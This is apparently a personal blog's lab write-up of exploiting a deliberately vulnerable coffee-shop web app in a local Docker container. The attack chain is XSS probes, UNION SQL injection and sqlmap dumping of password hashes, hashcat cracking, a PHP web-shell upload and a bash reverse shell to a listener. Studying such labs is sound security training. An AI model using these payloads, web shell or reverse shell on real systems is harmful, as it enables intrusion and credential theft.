--- 
title: "Basic Web App Exploit"
description: "Exploiting a web application with multiple vulnerabilities"
date: 2024-06-25 12:00:00 -100
image: /assets/images/Coffe Shop/Cofee Shop Web App.png
categories: [Vulnerability Assessment, Web Application]
tags: [arbitrary file upload, burp suite, client-side validation, docker, insufficient password security,sql injection, sqlmap, xss]    # TAG names should always be lowercase
---
*Cover image by [Freepik](https://www.freepik.com/)*

Here we will leverage vulnerabilities in a poorly designed website. The web application resides in a  docker container located on our local machine. The vulnerability assessment report will be included at the end

## Initial Recon and Info Gathering

Navigating to our localhost/capstone We see the following webpage

![Image of the website](/assets/images/Coffe%20Shop/Website%20Pic.png)
_Coffee store homepage_

Clicking on one of the available items listed allows us to enter a comment. Let's try a basic XSS test to test if the application will run arbitrary java script commands

```javascript
<script>alert(1)</script>
```

![XSS](/assets/images/Coffe%20Shop/Coffe%20XSS%20example.png)

Great, our first finding is this XSS vulnerability. The URL is also vulnerable to XSS attacks as it directly reflects text back to us

![XSS2](/assets/images/Coffe%20Shop/URL%20Reflected%20back%20at%20us.png)

This web application must store data in a database. Let's attempt to manipulate the URL with a simple [SQL](https://aws.amazon.com/what-is/sql/) injection statement

```sql
coffee.php?coffee=1' or 1=1-- -
```

This SQL injection allows us to retrieve all the items from the database

Since 1=1 equates to true, it allows us to retrieve all the available items. The comment delimiter `-- -` means that anything after it will be treated as comment and thus ignored by the database

![Simple SQL exploit](/assets/images/Coffe%20Shop/XSS%20Injection%202.png)

With this working, we can try to extract the number of columns we're querying as this will be important later. Glancing at the image below, there's probably `7` columns

![Number of Columns](/assets/images/Coffe%20Shop/Number%20of%20columns.png)

We can confirm the number of columns using the following line

```SQL
coffee=1' union select null,null,null,null,null,null,null-- -
```

![Confirmed columns](/assets/images/Coffe%20Shop/Confirmed%20number%20of%20columns.png)

Since the page still loads, it confirms we have 7 columns and can further exploit the database. Union select statements combine the results of two or more `SELECT` statements into a single result. The union select **MUST MATCH** the number of columns 

After enumerating the number of columns, we need to know what the actual table names are. We'll use the following command

```SQL
1' union select TABLE_NAME,TABLE_NAME,TABLE_NAME,TABLE_NAME,TABLE_NAME,TABLE_NAME,TABLE_NAME FROM INFORMATION_SCHEMA.TABLES-- -
```

`INFORMATION_SCHEMA.TABLES` contains information about all the tables in the database

All the tables are dumped

![Dumped Tables](/assets/images/Coffe%20Shop/Table_names.png)

Scrolling down, we see the non standard SQL tables that are probably related to this application

![Related tables](/assets/images/Coffe%20Shop/app%20tables.png)

Let's enumerate the columns as well

```SQL
coffee=1'union select COLUMN_NAME,COLUMN_NAME,COLUMN_NAME,COLUMN_NAME,COLUMN_NAME,COLUMN_NAME,COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS-- -
```

Important column names acquired 👌

![Password](/assets/images/Coffe%20Shop/Password.png)

Let's use the information from our table / column names to extract the password from the users table

```SQL
coffee=1' union select null,username,password,null,null,null,null FROM users-- -
```

![password obtained](/assets/images/Coffe%20Shop/Password%20Hashes.png)

Password hashes obtained. Now we need to identify the hash algorithm used in order to crack them

It looks like both my offline hash cracking tools `hash-identifier` and `hashid` could not identify the hash

![failed to identify](/assets/images/Coffe%20Shop/Unknown%20hash.png)

I'll opt for an online hash identifier tool instead

![Hash Identified](/assets/images/Coffe%20Shop/Hash%20Identified.png)

The hash is identified as potentially bcrypt

Now that we have an idea of what hash we have. Let's look up the corresponding hashcat module for blowfish, bcrypt

Utilizing the [hashcat wiki](https://hashcat.net/wiki/doku.php?id=example_hashes) we can see that blowfish, bcrypt corresponds to the hashcat 3200 mode

{% include warning.html content="Cracking hashes is resource intensive and should not be done on VMs with limited resources" %}

```bash
hashcat -m 3200 hashes.txt -w2 /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-100000.txt
```

We can see from the output that the hash obained from Jeremy `$2y$10$F9bvqz5eoawIS6g0FH.wGOUkNdBYLFBaCSzXvo2HTegQdNg/HlMJy` correspoonds to the password `captain1`

![Jeremy's Password](/assets/images/Coffe%20Shop/Hash%20revealed%20password.png)


### Utilizing SQLMap

[SQLmap](https://sqlmap.org/) is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection vulnerabilities in web applications.

To utilize SQLmap, we need to capture the request to the web application. To do this, we will use a tool built into Kali called Burpsuite to capture the request, then copy and paste that into a text file called `request.txt`

![Request](/assets/images/Coffe%20Shop/Burp%20request.png)

```bash
sqlmap -r request.txt --level-2
```

The output tells us that the applications coffee parameter is vulnerable to SQL injection and confirmed the back-end DBMS is MySQL. Vulnerabilities include boolean-based blind, time-based blind, and UNION query injection (which we utilized manually earlier)

![SQL map output](/assets/images/Coffe%20Shop/SQLmap%20output.png)

Let's modify our request to dump the users table

```bash
sqlmap -r request.txt  -T users -dump  
```

![passwords](/assets/images/Coffe%20Shop/sqlmap%20passwords.png)

We've obtained have every user & admins hashed password. Since we already cracked jeremy's password earlier. We can just login with that

![Nothing different](/assets/images/Coffe%20Shop/Nothing%20different.png)

We don't immediately see anything different or any type of admin panel available, so I'm going to run a ffuf scan to enumerate directories

{% include tip.html content="Enumerate directories before you attempt to exploit to avoid this problem" %}

```bash
 ffuf -u http://localhost/capstone/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -recursion
```

![ffuf scan](/assets/images/Coffe%20Shop/admin_php.png)

Running the following ffuf scan enumerated `/admin/admin.php` for us. We will login with Jeremy's admin credentials that we obtained earlier and navigate to that

![Add Coffee Page](/assets/images/Coffe%20Shop/add%20new%20coffee.png)

It looks like we have the ability to upload. Let's see what happens when we upload our new item

![MLG Coffee](/assets/images/Coffe%20Shop/MLG%20Coffee.png)

The upload was successful. We'll use the inspector in the browser to view the image source

![Image source](/assets/images/Coffe%20Shop/image%20location.png)

Looks like the image source is `assets/<assetnumber>` From here we will edit the request in Brupsuite to include a php command injection one liner

## Gaining shell access

![File named changed](/assets/images/Coffe%20Shop/File%20name%20changed.png)

As you can see from the picture above we had to change the file name to a `.php` file so that it would execute our php shell. We added the php reverse one liner that takes the parameter from the URL and executes it as a system command on the server. We also had to remove most of the image data below the [magic byte](https://en.wikipedia.org/wiki/List_of_file_signatures) `PNG` to avoid any errors in processing the request

```bash
<?php system($_GET['cmd']); ?>
```

![PHP One Liner](/assets/images/Coffe%20Shop/php%20one%20liner.png)

From checking the image source prevously, we will navigate to our image url `url/assets/<image number>.php?cmd=whoami` and test the simple command `whoami`

![RCE](/assets/images/Coffe%20Shop/RCE.png)

And boom goes the dynimaite, we have RCE. Let's set up our netcat listener to allow the incoming reverse shell that we're going to set up

```bash
nc -lvnp 9001
```

![netcat](/assets/images/Coffe%20Shop/netcat.png)

Now let's change the request from `whoami` to this bash reverse shell. We should also encode it for good measure

```bash
http://localhost/capstone/assets/21.php?cmd=/bin/bash -c 'bash -i >& /dev/tcp/192.168.101.130/9001 0>&1'

#URL encoded version
http://localhost/capstone/assets/21.php?cmd=/bin/bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.101.130%2F9001%200%3E%261%27
```

![Reverse Shell Obtained](/assets/images/Coffe%20Shop/Shell%20obtained.png)

And GG, we have successfully compromised this container. It's crucial to avoid security vulnerabilities like XSS, SQLi, & client-side validation. My full vulnerability report with recommended mitigations can be found below

## Vulnerability Assessment Report

<iframe src="/assets/images/Coffe Shop/Coffee Corp - Web Application Vulnerability Assessment .pdf#toolbar=0" width="100%" height="600px"></iframe>